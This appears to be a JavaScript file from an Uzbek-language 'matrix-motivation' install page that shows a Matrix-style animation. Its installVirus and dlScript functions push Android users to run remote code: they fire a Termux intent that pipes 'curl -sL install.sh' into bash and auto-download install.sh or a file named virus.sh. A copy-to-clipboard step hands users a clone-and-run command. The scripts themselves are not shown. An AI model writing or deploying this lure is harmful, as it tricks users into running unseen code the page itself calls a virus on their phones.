// === termux-install.html dan ajratildi (XOLERIC SEO) ===
const canvas=document.getElementById('c'),ctx=canvas.getContext('2d');
let W,H,fs,cols,drops=[];
const chars='アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン01';

function resize(){
  W=canvas.width=window.innerWidth;
  H=canvas.height=window.innerHeight;
  fs=Math.max(10,Math.min(18,W/55));
  cols=Math.floor(W/fs);
  while(drops.length<cols)drops.push(Math.random()*-100);
  while(drops.length>cols)drops.pop();
}

function draw(){
  ctx.fillStyle='rgba(0,0,0,0.04)';
  ctx.fillRect(0,0,W,H);
  ctx.font=fs+'px monospace';
  for(let i=0;i<cols;i++){
    const c=chars[Math.floor(Math.random()*chars.length)];
    const x=i*fs,y=drops[i]*fs;
    ctx.fillStyle=`rgba(0,255,0,${0.1+(y/H)*0.5})`;
    ctx.fillText(c,x,y);
    if(y>H&&Math.random()>0.975)drops[i]=0;
    drops[i]++;
  }
}

// Detect Termux
function detectTermux() {
  const ua=navigator.userAgent;
  const isAndroid=/Android/i.test(ua);
  const termuxBtn=document.getElementById('termuxBtn');

  if(isAndroid){
    document.getElementById('statusText').textContent='Android detected';
    // Try to detect if Termux is installed via intent
    termuxBtn.style.display='none';
  }else{
    document.getElementById('steps').innerHTML=
      '<div class="step"><span class="step-num">⚠</span><span>Bu sahifa faqat Android + Termux uchun</span></div>'+
      '<div class="step"><span class="step-num">1</span><span>Telefoningizga <b>Termux</b> o\'rnating</span></div>'+
      '<div class="step"><span class="step-num">2</span><span>Termuxni ochib: <b style="color:#0f0">pkg install git -y && git clone https://github.com/xolerc/matrix-motivation && cd matrix-motivation && bash install.sh</b></span></div>';
    termuxBtn.style.display='block';
    termuxBtn.href='https://f-droid.org/packages/com.termux/';
    document.getElementById('installBtn').textContent='TERMUX O\'RNATISH';
    document.getElementById('installBtn').className='btn btn-termux';
    document.getElementById('statusText').textContent='Desktop mode';
    return false;
  }
  return true;
}

function installVirus() {
  const isTermux=/Termux/i.test(navigator.userAgent) || window.location.protocol==='termux:';

  if(/Android/i.test(navigator.userAgent)){
    // Try Termux intent
    const scriptUrl = window.location.origin + window.location.pathname.replace(/\/[^/]*$/, '') + '/virus.sh';
    const installUrl = window.location.origin + window.location.pathname.replace(/\/[^/]*$/, '') + '/install.sh';

    document.getElementById('overlay').classList.add('active');
    document.getElementById('overlayMsg').innerHTML =
      'Termux ochilmoqda...<br><br>'+
      '<span style="font-size:11px;opacity:0.7">Agar Termux ochilmasa, qo\'lda bajaring:<br><br>'+
      '<b style="color:#0f0">pkg install git -y<br>'+
      'git clone https://github.com/xolerc/matrix-motivation<br>'+
      'cd matrix-motivation<br>'+
      'bash install.sh</b></span>';

    // Try to trigger Termux via intent URL
    window.location.href = 'termux://open?action=run&command=curl -sL ' + encodeURIComponent(installUrl) + ' | bash';

    // Also try the direct download approach
    setTimeout(() => {
      // Download the script
      const a = document.createElement('a');
      a.href = installUrl;
      a.download = 'install.sh';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      document.getElementById('statusText').textContent = 'Downloaded! Open in Termux';
    }, 1000);
  } else {
    // Desktop - download the script
    const a = document.createElement('a');
    a.href = window.location.origin + window.location.pathname.replace(/\/[^/]*$/, '') + '/install.sh';
    a.download = 'install.sh';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    document.getElementById('statusText').textContent = 'Downloaded!';
  }
}

function dlScript() {
  const a = document.createElement('a');
  a.href = window.location.origin + window.location.pathname.replace(/\/[^/]*$/, '') + '/virus.sh';
  a.download = 'virus.sh';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  document.getElementById('notif-banner').style.display='none';
}

// Let user copy command
function copyCmd() {
  const cmd = 'pkg install git -y && git clone https://github.com/xolerc/matrix-motivation && cd matrix-motivation && bash install.sh';
  if (navigator.clipboard) {
    navigator.clipboard.writeText(cmd);
    document.getElementById('statusText').textContent = 'Copied!';
  }
}

window.addEventListener('resize',resize);
window.addEventListener('load',()=>{
  resize();
  setInterval(draw,50);
  detectTermux();
});